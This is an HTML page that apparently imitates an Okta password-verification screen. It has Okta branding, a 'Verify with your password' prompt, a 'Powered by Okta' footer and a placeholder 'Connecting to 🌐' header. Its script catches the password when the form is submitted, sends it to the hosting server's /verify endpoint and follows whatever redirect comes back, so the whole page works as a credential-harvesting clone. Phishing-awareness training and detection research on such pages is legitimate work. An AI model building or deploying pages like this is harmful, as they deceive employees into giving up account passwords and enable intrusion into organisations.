<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Verify - Okta</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .top-header {
            text-align: center;
            padding: 20px 10px;
            border-bottom: 1px solid #e6e6e6;
            background: #fafafa;
        }

        .top-header h6 {
            font-weight: 500;
            color: #666;
            margin: 0;
        }

        .top-header small {
            color: #888;
        }

        .login-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            width: 100%;
            max-width: 420px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
        }

        .okta-logo {
            font-size: 36px;
            font-weight: 700;
            color: #1f4fa3;
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid #eee;
            letter-spacing: 1px;
        }

        .login-body {
            padding: 30px;
            text-align: center;
        }

        .password-icon {
            margin-top: -60px;
            margin-bottom: 20px;
        }

        .password-icon img {
            width: 70px;
            height: 70px;
        }

        .verify-title {
            font-weight: 500;
            margin-bottom: 25px;
            color: #555;
        }

        .form-control {
            height: 42px;
        }

        .password-wrapper {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #777;
        }

        .btn-okta {
            background: #2563d1;
            border: none;
            height: 42px;
            font-weight: 500;
            margin-top: 15px;
        }

        .btn-okta:hover {
            background: #1f54b8;
        }

        .links {
            margin-top: 20px;
            font-size: 14px;
        }

        .links a {
            display: block;
            color: #666;
            text-decoration: none;
            margin-top: 5px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .bottom-footer {
            font-size: 13px;
            color: #888;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
        }

        /* ALERT */

        .okta-alert {
            border: 1px solid #ddd;
            background: #fafafa;
            padding: 15px;
            margin-bottom: 20px;
            text-align: left;
        }

        .alert-icon {
            width: 42px;
            height: 42px;
            background: #e74c3c;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            border-radius: 4px;
        }

        @media (max-width:576px) {

            .login-card {
                border: none;
                box-shadow: none;
            }

            .login-body {
                padding: 20px;
            }

            .okta-logo {
                font-size: 30px;
            }

        }

        #okta-sign-in .auth-beacon-border,
        #okta-sign-in .beacon-loading::after {
            border-radius: 50%;
            bottom: -5px;
            left: -5px;
            position: absolute;
            right: -5px;
            top: -5px;
        }

        .password-icon {
            position: relative;
            display: flex;
            justify-content: center;
            margin-top: -60px;
            margin-bottom: 20px;
        }

        .password-icon img {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            object-fit: cover;
        }

        #okta-sign-in .password-icon {
            position: relative;
            display: flex;
            justify-content: center;
            margin-top: -60px;
            margin-bottom: 20px;
        }

        #okta-sign-in .password-icon img {
            width: 70px;
            height: 70px;
            position: relative;
            z-index: 2;
        }

        #okta-sign-in .auth-beacon-border {
            border: 3px solid #cbd5df;
            border-radius: 50%;
            position: absolute;
            top: -5px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 80px;
        }
    </style>
</head>

<body>

    <div class="top-header">

        <h6>
            Connecting to 🌐
        </h6>

        <small>
            Sign in with your account to access Okta Dashboard
        </small>

    </div>

    <div class="login-container">

        <div class="login-card">

            <div class="okta-logo mb-2">
                okta
            </div>

            <div class="login-body">
                <div id="okta-sign-in">

                    <div class="password-icon">

                        <div class="auth-beacon-border"></div>

                        <img src="/static/password_70x70.png" alt="password">

                    </div>

                </div>

                <div class="verify-title">
                    Verify with your password
                </div>

                <div id="form-error" class="okta-alert d-none">

                    <div class="d-flex align-items-center">

                        <div class="alert-icon me-3">
                            !
                        </div>

                        <div>
                            We found some errors. Please review the form and make corrections.
                        </div>

                    </div>

                </div>

                <form id="password-form" action="/verify" method="POST">

                    <div class="text-start mb-2">

                        <label class="form-label">Password</label>

                    </div>

                    <div class="password-wrapper">

                        <input id="password" name="password" type="password" class="form-control" required>

                        <span class="eye-icon" id="toggle-password">
                            👁
                        </span>

                        <div id="password-error" class="invalid-feedback text-start">
                            Password cannot be empty
                        </div>

                    </div>

                    <button class="btn btn-okta w-100 text-white">
                        Verify
                    </button>

                    <div class="links">

                        <a href="#">Forgot password?</a>
                        <a href="#">Back to sign in</a>

                    </div>

                </form>

            </div>

        </div>

    </div>

    <div class="bottom-footer">

        <div>
            Powered by Okta
        </div>

        <div>
            Privacy Policy
        </div>

    </div>

    <script>

        const form = document.getElementById('password-form');
        const input = document.getElementById('password');
        const errorDiv = document.getElementById('password-error');
        const alertBox = document.getElementById('form-error');

        input.addEventListener("input", () => {

            input.classList.remove("is-invalid");
            alertBox.classList.add("d-none");

        });

        form.addEventListener('submit', async (e) => {

            e.preventDefault();

            input.classList.remove('is-invalid');

            const formData = new URLSearchParams();

            for (const [key, value] of new FormData(form)) {
                formData.append(key, value);
            }

            const response = await fetch(form.action, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString(),
            });
            const data = await response.json();

            if (data.redirect) {
                window.location.href = data.redirect;
                return;
            }

            if (!data.success) {

                errorDiv.textContent = data.error || "Login failed.";

                input.classList.add("is-invalid");
                alertBox.classList.remove("d-none");
            }

        });

        const toggle = document.getElementById("toggle-password");

        toggle.addEventListener("click", () => {

            const type = input.getAttribute("type") === "password" ? "text" : "password";
            input.setAttribute("type", type);

        });

    </script>

</body>

</html>
